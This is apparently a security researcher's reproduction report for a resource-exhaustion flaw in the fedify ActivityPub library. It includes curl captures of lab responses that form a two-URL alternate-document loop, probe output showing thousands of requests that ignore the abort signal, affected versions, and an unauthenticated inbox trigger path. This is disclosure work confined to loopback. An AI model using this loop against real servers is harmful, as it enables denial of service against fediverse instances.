@@ -1,0 +1,293 @@
+fedify — Lead 0001 — ATTACK RUN
+`getRemoteDocument()`'s alternate-document hop re-enters the loader through a bare
+one-argument call, resetting the redirect cap and the visited-URL set that CVE-2026-34148
+added, and discarding the caller's `AbortSignal`.
+
+Project    : fedify-dev/fedify
+Pinned tag : 2.3.8 / 12119e5c4772c757804e18e9d80401163ccc2bc0   (npm `latest` at capture time)
+Under test : the published @fedify/vocab-runtime@2.3.8 artifact, src byte-identical to the tag
+Captured   : 2026-09-27T01:13:09Z
+Marker     : CVEHUNT-0001-9CAC98CC-B
+
+Same loader construction as the control, same `maxRedirection: 2`, same
+`allowPrivateAddress: true`. **Only the kind of hop the server offers is different.**
+
+================================================================================
+THE RESPONSE THAT TRIGGERS IT — verbatim, from curl against the lab server
+================================================================================
+
+HTML `<link rel="alternate">` path (docloader.ts:244):
+
+$ curl -sS -D - http://127.0.0.1:45899/CVEHUNT-0001-9CAC98CC-B-a
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Date: Sun, 27 Sep 2026 01:12:00 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Transfer-Encoding: chunked
+
+<html><head><link rel="alternate" type="application/activity+json" href="http://127.0.0.1:45899/CVEHUNT-0001-9CAC98CC-B-b"></head></html>
+
+`Link` response-header path (docloader.ts:192) — note the content type is `text/plain`, so
+the HTML branch is not even needed:
+
+$ curl -sS -D - http://127.0.0.1:45898/CVEHUNT-0001-9CAC98CC-B-a
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Link: <http://127.0.0.1:45898/CVEHUNT-0001-9CAC98CC-B-b>; rel="alternate"; type="application/activity+json"
+Date: Sun, 27 Sep 2026 01:12:01 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Transfer-Encoding: chunked
+
+not json-ld
+
+`/…-a` points at `/…-b` and `/…-b` points back at `/…-a`. Both guards in
+`getRemoteDocument()` reject only a **self** reference — `altUri.href !== docUrl.href` at
+docloader.ts:186 and `new URL(attribs.href, docUrl).href !== docUrl.href` at :238 — so a
+two-node cycle is never detected, and the visited-URL set that would have caught it was reset
+to empty by the re-entry.
+
+================================================================================
+ROW 1 — the Link-header hop
+================================================================================
+
+$ MARK=CVEHUNT-0001-9CAC98CC-B PORT=45872 node probe.mjs header
+
+{
+    "mode": "header",
+    "maxRedirection": 2,
+    "stopAfter": 60,
+    "marker": "CVEHUNT-0001-9CAC98CC-B",
+    "outcome": "RESOLVED",
+    "finalUrl": "http://127.0.0.1:45872/CVEHUNT-0001-9CAC98CC-B-b",
+    "elapsedMs": 171,
+    "requestsServed": 60,
+    "firstPathsServed": [
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b"
+    ],
+    "boundHeld": false
+}
+
+================================================================================
+ROW 2 — the HTML <link rel="alternate"> hop
+================================================================================
+
+$ MARK=CVEHUNT-0001-9CAC98CC-B PORT=45873 node probe.mjs html
+
+{
+    "mode": "html",
+    "maxRedirection": 2,
+    "stopAfter": 60,
+    "marker": "CVEHUNT-0001-9CAC98CC-B",
+    "outcome": "RESOLVED",
+    "finalUrl": "http://127.0.0.1:45873/CVEHUNT-0001-9CAC98CC-B-b",
+    "elapsedMs": 169,
+    "requestsServed": 60,
+    "firstPathsServed": [
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b"
+    ],
+    "boundHeld": false
+}
+
+**60 is the test server's own stop-after value, not a bound the loader imposed.** The server
+answers request 60 with a valid ActivityStreams document purely so the process can terminate
+and report; the chain was still going. `firstPathsServed` shows the cycle: a, b, a, b, …
+
+================================================================================
+ROW 3 — THE AGGRAVATOR: the caller cannot stop it either
+================================================================================
+
+The same cycle, with the caller holding an `AbortController` and aborting it after 1500 ms.
+A harness timeout gives up at 6000 ms.
+
+$ MARK=CVEHUNT-0001-9CAC98CC-B PORT=45874 STOP_AFTER=100000 node probe.mjs signal
+
+{
+    "mode": "signal",
+    "maxRedirection": 2,
+    "stopAfter": 100000,
+    "marker": "CVEHUNT-0001-9CAC98CC-B",
+    "abortedAfterMs": 1500,
+    "elapsedMs": 6000,
+    "requestsServed": 2827,
+    "outcome": "HARNESS-GAVE-UP",
+    "stillRunningMsAfterAbort": 4500,
+    "requestsPerSecond": 471,
+    "firstPathsServed": [
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b",
+        "/CVEHUNT-0001-9CAC98CC-B-a",
+        "/CVEHUNT-0001-9CAC98CC-B-b"
+    ],
+    "boundHeld": false
+}
+
+The loader was still issuing requests **4500ms after the caller asked it to stop**, at roughly
+471 requests per second. `load()` checks `options?.signal?.throwIfAborted()` on entry
+(docloader.ts:308), but the alternate-document re-entry passes no `options` at all, so from the
+hop onward there is no signal to check. Every hop also runs `validatePublicUrl()`, so an equal
+number of DNS lookups is amplified alongside the HTTP requests.
+
+This half is unambiguous on any reading: dropping a caller-supplied `AbortSignal` is a bug
+whether or not per-hop alternate-document following is considered intended.
+
+================================================================================
+AFFECTED RANGE — reproduced against every published line tip, not inferred
+================================================================================
+
+Each line tip installed into its own tree and run through the same probe:
+
+@fedify/vocab-runtime        2.3.8     UNBOUNDED  (60 requests, our stop)
+@fedify/vocab-runtime        2.2.13    UNBOUNDED  (60 requests, our stop)
+@fedify/vocab-runtime        2.1.24    UNBOUNDED  (60 requests, our stop)
+@fedify/vocab-runtime        2.0.28    UNBOUNDED  (60 requests, our stop)
+@fedify/fedify               1.10.11   UNBOUNDED  (60 requests, our stop)
+@fedify/fedify               1.9.12    UNBOUNDED  (60 requests, our stop)
+
+All four maintained 2.x lines and both 1.x lines. **`GHSA-xw9q-2mv6-9fr8` listed 1.10.11 and
+1.9.12 as patched**; they are patched for the hop that advisory covered and unbounded on this
+one. The `GHSA-gm9m` fix never covered the alternate-document hop in any line.
+
+**Still present on `main`** at capture time: the same bare one-argument calls at
+packages/vocab-runtime/src/docloader.ts:201 and :263.
+
+================================================================================
+THE PARENT ADVISORY'S OWN "FIXED" VERSIONS ARE ALL STILL UNBOUNDED ON THIS HOP
+================================================================================
+
+GHSA-gm9m-gwc4-hwgp / CVE-2026-34148 (resolved against OSV at capture time; the two ids alias
+each other) carries CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H — 7.5 HIGH — and this summary:
+
+  "Fedify affected by resource exhaustion caused by unbounded redirect following during remote
+   key/document resolution"
+
+Its stated flow is the one reproduced above, verbatim from the advisory:
+
+  "Fedify verifies ActivityPub HTTP signatures by fetching the remote keyId during request
+   processing. The relevant flow is handleInboxInternal() -> verifyRequest() ->
+   fetchKeyInternal() -> document loader."
+
+  "if an attacker-controlled keyId or actor URL responds with 302 Location: <same URL>, a
+   single ActivityPub request can trigger tens or hundreds of outbound requests"
+
+It declares these ranges fixed:
+
+  @fedify/fedify           introduced 0        fixed 1.9.6
+  @fedify/vocab-runtime    introduced 0        fixed 2.0.8
+  @fedify/vocab-runtime    introduced 2.1.0    fixed 2.1.1
+  @fedify/fedify           introduced 1.10.0   fixed 1.10.5
+  @fedify/fedify           introduced 2.0.0    fixed 2.0.8
+  @fedify/fedify           introduced 2.1.0    fixed 2.1.1
+
+And the line tip on top of every one of those fixes is still unbounded here — not via a
+`302 Location`, which is now capped, but via the alternate-document hop, which was never
+threaded:
+
+  @fedify/fedify          1.9.12   sits above the 1.9.6 fix    -> UNBOUNDED
+  @fedify/fedify          1.10.11  sits above the 1.10.5 fix   -> UNBOUNDED
+  @fedify/vocab-runtime   2.0.28   sits above the 2.0.8 fix    -> UNBOUNDED
+  @fedify/vocab-runtime   2.1.24   sits above the 2.1.1 fix    -> UNBOUNDED
+  @fedify/vocab-runtime   2.2.13   (line added after)          -> UNBOUNDED
+  @fedify/vocab-runtime   2.3.8    current release             -> UNBOUNDED
+
+Same entry point, same impact, same CVSS vector. The cap and the loop detector both exist in
+`load()` already, as parameters; the alternate-document hop simply forgets to pass them.
+
+This project has accepted an incomplete-fix advisory on exactly this pattern before:
+GHSA-xw9q-2mv6-9fr8 / CVE-2026-50131 is titled "Fedify has an incomplete SSRF mitigation after
+GHSA-p9cg-vqcc-grcx". All identifiers above were resolved against the OSV API at capture time
+and exist.
+
+================================================================================
+WHERE THE CHECK SHOULD HAVE BEEN
+================================================================================
+
+packages/vocab-runtime/src/docloader.ts. The loader carries both bounds as default parameters:
+
+  async function load(
+    url: string,
+    options?: DocumentLoaderOptions,
+    redirected = 0,
+    visited = new Set<string>(),
+  ): Promise<RemoteDocument> {
+
+and the 3xx path correctly threads them through:
+
+            return await load(redirectUrl, options, redirected + 1, visited);
+
+That same `load` is handed to `getRemoteDocument()` as its `fetch` parameter:
+
+          const result = await getRemoteDocument(currentUrl, response, load);
+
+and `getRemoteDocument()` calls it with ONE argument on both alternate-document hops:
+
+  :192  return await fetch(altUri.href);
+  :244  return await fetch(new URL(attribs.href, docUrl).href);
+
+Because `redirected` and `visited` are **default parameters**, a one-argument call resets the
+counter to 0 and the visited set to empty — and `options` becomes `undefined`, taking
+`options.signal` with it. The fix is to thread the state the 3xx path already threads.
+
+The same shape is present in the authenticated loader, which passes its own `load` the same
+way: packages/fedify/src/utils/docloader.ts:87
+`return getRemoteDocument(url, response, load);`
+
+================================================================================
+REACHABILITY — unauthenticated, in a default integration
+================================================================================
+
+`getDocumentLoader()` is the default document loader. HTTP-Signature verification fetches the
+remote `keyId` during inbound request processing — packages/fedify/src/sig/key.ts:825:
+
+    try {
+      const remoteDocument =
+        await (options.documentLoader ?? getDocumentLoader())(
+          keyId,
+        );
+
+`keyId` comes out of the inbound `Signature` / `Signature-Input` header, so the trigger is an
+unauthenticated `POST` to any inbox or shared inbox. That is the parent advisory's own stated
+path, quoted from GHSA-gm9m-gwc4-hwgp: *"Fedify verifies ActivityPub HTTP signatures by
+fetching the remote keyId during request processing. The relevant flow is
+handleInboxInternal() -> verifyRequest() -> fetchKeyInternal() -> document loader."*
+
+Nothing beyond an ordinary `createFederation()` integration is required, and
+`allowPrivateAddress` stays at its default `false` — the destination is the attacker's own
+public host, so the SSRF guard is not in the path.
+
+================================================================================
+SCOPE AND CONFIGURATION, STATED PLAINLY
+================================================================================
+
+- **This instance only.** Every server binds to 127.0.0.1. No fediverse instance, no hosted
+  service, and no third party was ever contacted. The packages came from the public npm
+  registry; the integrity hashes are in versions.txt.
+- **`allowPrivateAddress: true`** is set in every row so the lab can stay on loopback. It
+  gates `validatePublicUrl` only, and the control run proves it does not disable the redirect
+  bound. See control.http.txt.
+- **`maxRedirection: 2`** is set explicitly so the bound is small enough to observe. The
+  default is larger; the finding is that on this hop NO value has any effect, which the
+  60-request and 2800-request runs show.
+- **The stop-after is ours.** The lab terminates its own loop. Nothing here ran unbounded
+  against anything, including this host.
